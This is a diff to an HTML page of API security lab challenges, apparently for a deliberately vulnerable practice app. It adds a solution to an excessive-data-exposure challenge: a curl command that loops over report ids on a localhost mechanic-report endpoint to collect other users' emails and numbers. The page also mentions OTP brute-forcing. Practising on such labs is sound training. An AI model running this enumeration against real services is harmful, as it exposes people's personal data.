@@ -130,6 +130,11 @@ un removed api endpoint v2 does not rate limit and allows brute forcing for otps
       </ul>
       <h2 id="excessive-data-exposure">Excessive Data Exposure</h2>
       <h3 id="challenge-4-find-an-api-endpoint-that-leaks-sensitive-information-of-other-users">Challenge 4 - Find an API endpoint that leaks sensitive information of other users</h3>
+      <p>==SOLVED==
+        mechanical reports return json info about the users and sensetive information including emails, numbers. </p>
+        <p>curl -X GET <a href="http://localhost:8888/workshop/api/mechanic/mechanic_report\?report_id\=$t">http://localhost:8888/workshop/api/mechanic/mechanic_report\?report_id\=$t</a> -H &quot;Authorization: Bearer {$TOKEN}}&quot;| tee report$t
+        ==SOLVED==</p>
+        
       <h3 id="challenge-5-find-an-api-endpoint-that-leaks-an-internal-property-of-a-video">Challenge 5 - Find an API endpoint that leaks an internal property of a video</h3>
       <p>In this challenge, you need to find an internal property of the video resource that shouldn’t be exposed to the user. This property name and value can help you to exploit other vulnerabilities.</p>
       <h2 id="rate-limiting">Rate Limiting</h2>
